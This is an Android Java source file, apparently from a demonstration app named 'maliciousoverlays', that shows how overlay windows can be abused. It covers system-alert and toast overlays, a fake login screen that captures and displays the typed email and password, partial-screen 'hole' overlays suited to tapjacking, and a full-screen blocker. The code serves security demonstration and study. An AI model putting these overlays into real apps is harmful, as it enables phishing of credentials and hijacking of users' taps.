package com.davidebove.maliciousoverlays;

import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.support.design.widget.Snackbar;
import android.support.v7.app.AppCompatActivity;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.RatingBar;
import android.widget.TextView;
import android.widget.Toast;

import java.util.Random;

import static android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_CODE = 1337;
    private static final int OVERLAY_WIDTH_HEIGHT = 200;
    private static final int SYSALERT_WIDTH_HEIGHT = 200;
    private WindowManager wm = null;

    View systemView = null;
    View overlayView = null;
    View toastView = null;
    View loginView = null;
    View holeView_1 = null, holeView_2 = null;
    View blockerView = null;

    private Handler handler = new Handler();
    private boolean rateLimitToast = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);

        checkPermissions();

        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.N_MR1) {
            findViewById(R.id.btn_custom_toast).setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View view) {
                    Snackbar snackbar = Snackbar.make(findViewById(android.R.id.content),
                            "This button does nothing since Android 8.0.\nBefore that, you could create custom windows with \"Toast\" identity and permissions.",
                            Snackbar.LENGTH_LONG)
                            .setDuration(15000);

                    TextView tv = (TextView) snackbar.getView().findViewById(android.support.design.R.id.snackbar_text);
                    tv.setMaxLines(6);
                    snackbar.show();
                }
            });
        }

        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Toast.makeText(this, "Note: since Android 8.0 Oreo, any overlay is TYPE_APPLICATION_OVERLAY", Toast.LENGTH_LONG).show();
        }
    }

    @Override
    protected void onPause() {
        if (toastView != null) rateLimitToast = true;
        super.onPause();
    }

    @Override
    protected void onResume() {
        if (toastView != null) rateLimitToast = false;
        super.onResume();
    }

    @Override
    protected void onDestroy() {
        destroySystemAlert();
        destroyOverlay();
        destroyToast();
        destroyHole();
        destroyLogin();

        super.onDestroy();
    }

    public void createSystemAlert(View view) {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {

                if (systemView != null)
                    destroySystemAlert();

                TextView v = new TextView(getApplicationContext());
                v.setBackgroundColor(Color.RED);
                v.setText("System");

                // SYSTEM_ALERT
                int windowType;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    windowType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                } else {
                    windowType = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
                }

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        windowType,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                                FLAG_NOT_TOUCH_MODAL |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                        PixelFormat.TRANSLUCENT);
                params.x = 0;
                params.alpha = 0.5f;
                params.y = -250;
                params.width = params.height = SYSALERT_WIDTH_HEIGHT;
                wm.addView(v, params);
                systemView = v;
            }
        }, 1000);
    }


    public void createOverlay(View view) {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (overlayView != null)
                    destroyOverlay();

                TextView v = new TextView(getApplicationContext());
                v.setBackgroundColor(Color.BLUE);
                v.setText("Overlay");

                // SYSTEM_OVERLAY
                int windowType;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    windowType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                } else {
                    windowType = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
                }

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        windowType,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                                FLAG_NOT_TOUCH_MODAL |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                        PixelFormat.TRANSLUCENT);
                params.x = SYSALERT_WIDTH_HEIGHT;
                params.alpha = 0.5f;
                params.width = params.height = OVERLAY_WIDTH_HEIGHT;
                wm.addView(v, params);
                overlayView = v;
            }
        }, 1000);
    }


    public void createToast(View view) {
        if (toastView != null) {
            destroyToast();
        }

        // create toast
        LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
        assert inflater != null;

        toastView = inflater.inflate(R.layout.toast_layout, null);
        if (toastView == null)
            return;


        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                final Toast toast = new Toast(getApplicationContext());
                toast.setView(toastView);
                toast.setDuration(Toast.LENGTH_LONG);

                // rotate rating of stars
                RatingBar rating = toastView.findViewById(R.id.toast_rating);
                if (rating != null) {
                    int next = ((int)rating.getRating() + 1) % 6;
                    rating.setRating(next);
                }

                if (toastView != null) {
                    toast.show();

                    int delayMillis = 3500;
                    if (rateLimitToast) delayMillis = 20000;
                    handler.postDelayed(this, delayMillis);
                } else {
                    toast.cancel();
                }
            }
        }, 500);
    }

    public void createCustomToast(View view) {

        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (toastView != null)
                    destroyToast();

                TextView v = new TextView(getApplicationContext());
                v.setBackgroundColor(Color.YELLOW);
                v.setText("Toast");

                // TYPE_TOAST
                int windowType;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    windowType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                } else {
                    windowType = WindowManager.LayoutParams.TYPE_TOAST;
                }

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        windowType,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                        PixelFormat.TRANSLUCENT);

                params.windowAnimations = android.R.style.Animation_Toast;
                params.x = 200;
                params.alpha = 0.5f;
                params.width = params.height = 300;
                wm.addView(v, params);
                toastView = v;
            }
        }, 1000);
    }


    public void createLogin(View view) {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {

                if (loginView != null)
                    destroyLogin();

                LayoutInflater inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
                assert inflater != null;

                final View login_view = inflater.inflate(R.layout.activity_login, null);
                Button btn_login = login_view.findViewById(R.id.btn_login);

                btn_login.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        TextView email = login_view.findViewById(R.id.email);
                        TextView password = login_view.findViewById(R.id.nopasswd);
                        Toast.makeText(MainActivity.this,
                                String.format("Stole your credentials: %s:%s", email.getText(), password.getText()),
                                Toast.LENGTH_SHORT).show();
                        destroyLogin();
                    }
                });

                // SYSTEM_ALERT
                int windowType;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    windowType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                } else {
                    windowType = WindowManager.LayoutParams.TYPE_SYSTEM_ALERT;
                }

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        windowType,
                        WindowManager.LayoutParams.FLAG_SECURE |
                                FLAG_NOT_TOUCH_MODAL |
                                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                        PixelFormat.TRANSLUCENT);
                params.gravity = Gravity.START | Gravity.TOP;
                params.x = 0;
                params.y = 100;
                TypedValue tv = new TypedValue();
                if (getTheme().resolveAttribute(android.R.attr.actionBarSize, tv, true)) {
                    params.y = TypedValue.complexToDimensionPixelSize(tv.data, getResources().getDisplayMetrics());
                }

                wm.addView(login_view, params);
                loginView = login_view;
            }
        }, 1000);
    }

    public void createHole(View v) {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (holeView_1 != null)
                    destroyHole();

                FillView hole_upper = new FillView(getApplicationContext());
                FillView hole_bottom = new FillView(getApplicationContext());

                // SYSTEM_ALERT
                WindowManager.LayoutParams params_upper = createStandardParams();
                WindowManager.LayoutParams params_bottom = createStandardParams();

                TypedValue tv = new TypedValue();
                if (getTheme().resolveAttribute(android.R.attr.actionBarSize, tv, true)) {
                    params_upper.y = TypedValue.complexToDimensionPixelSize(tv.data, getResources().getDisplayMetrics());
                    params_bottom.y = TypedValue.complexToDimensionPixelSize(tv.data, getResources().getDisplayMetrics());
                }

                params_upper.x = 0;
                params_upper.y += 0;
                params_upper.width = getResources().getDisplayMetrics().widthPixels;
                params_upper.height = 350;
                wm.addView(hole_upper, params_upper);

                params_bottom.x = 0;
                params_bottom.y += 700;
                params_bottom.width = getResources().getDisplayMetrics().widthPixels;
                params_bottom.height = getResources().getDisplayMetrics().heightPixels;
                wm.addView(hole_bottom, params_bottom);

                holeView_1 = hole_upper;
                holeView_2 = hole_bottom;
            }
        }, 1000);

    }

    public void createBlocker(View v) {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (blockerView != null)
                    destroyBlocker();

                FillView wholeFiller = new FillView(getApplicationContext());
                wholeFiller.setColor(Color.argb(50, 255,255,255));

                // SYSTEM_ALERT
                WindowManager.LayoutParams params_whole = createStandardParams();

                TypedValue tv = new TypedValue();
                if (getTheme().resolveAttribute(android.R.attr.actionBarSize, tv, true)) {
                    params_whole.y = TypedValue.complexToDimensionPixelSize(tv.data, getResources().getDisplayMetrics());
                }

                params_whole.width = getResources().getDisplayMetrics().widthPixels;
                params_whole.height = getResources().getDisplayMetrics().heightPixels;
                wm.addView(wholeFiller, params_whole);

                blockerView = wholeFiller;
            }
        }, 1000);

    }

    private WindowManager.LayoutParams createStandardParams() {
        int windowType;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            windowType = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            windowType = WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;
        }

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.WRAP_CONTENT,
                windowType,
                WindowManager.LayoutParams.FLAG_FORCE_NOT_FULLSCREEN |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                        WindowManager.LayoutParams.FLAG_SECURE,
                PixelFormat.TRANSLUCENT);
        params.gravity = Gravity.START | Gravity.TOP;
        params.x = params.y = 0;
        return params;
    }

    private void checkPermissions() {
        // check if we already have permission to draw over other apps
        if (!Settings.canDrawOverlays(this)) {
            // if not construct intent to request permission
            final Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            // request permission via start activity for result
            startActivityForResult(intent, REQUEST_CODE);
        }
    }


    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        // check if received result code
        // is equal our requested code for draw permission
        if (requestCode == REQUEST_CODE) {
            // if so check once again if we have permission
            if (!Settings.canDrawOverlays(this)) {
                Toast.makeText(this, "No privileges", Toast.LENGTH_LONG).show();
            }
        }
    }

    private void destroySystemAlert() {
        if (systemView != null) {
            wm.removeView(systemView);
            systemView = null;
        }
    }

    private void destroyOverlay() {
        if (overlayView != null) {
            wm.removeView(overlayView);
            overlayView = null;
        }
    }

    private void destroyToast() {
        if (toastView != null) {
            wm.removeView(toastView);
            toastView = null;
        }
    }

    private void destroyLogin() {
        if (loginView != null) {
            wm.removeView(loginView);
            loginView = null;
        }
    }

    private void destroyHole() {
        if (holeView_1 != null) {
            wm.removeView(holeView_1);
            wm.removeView(holeView_2);
            holeView_1 = null;
            holeView_2 = null;
        }
    }

    private void destroyBlocker() {
        if (blockerView != null) {
            wm.removeView(blockerView);
            blockerView = null;
        }
    }
}
